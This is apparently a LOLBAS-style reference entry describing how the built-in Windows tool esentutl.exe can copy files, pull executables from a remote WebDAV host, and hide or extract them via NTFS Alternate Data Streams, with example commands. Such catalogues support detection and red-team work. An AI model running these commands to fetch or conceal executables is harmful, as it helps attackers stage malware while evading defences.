## Esentutl.exe
* Functions: Copy, Download, Write ADS, Read ADS
```

esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o
Copies the source VBS file to the destination VBS file.

esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o
Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.

esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o
Copies the source Alternate Data Stream (ADS) to the destination EXE.

esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.txt:file.exe /o
Copies the source EXE to the destination Alternate Data Stream (ADS) of the destination file.

esentutl.exe /y \\82.221.113.85\webdav\file.exe /d c:\ADS\file.exe /o
Copies the source EXE to the destination EXE file.

esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
Copies the source EXE to the destination EXE file
```
   
* Resources:   
  * https://twitter.com/egre55/status/985994639202283520
   
* Full path:   
  * c:\windows\system32\esentutl.exe
  * c:\windows\sysWOW64\esentutl.exe
   
* Notes: Thanks to egre55 - @egre55  
   
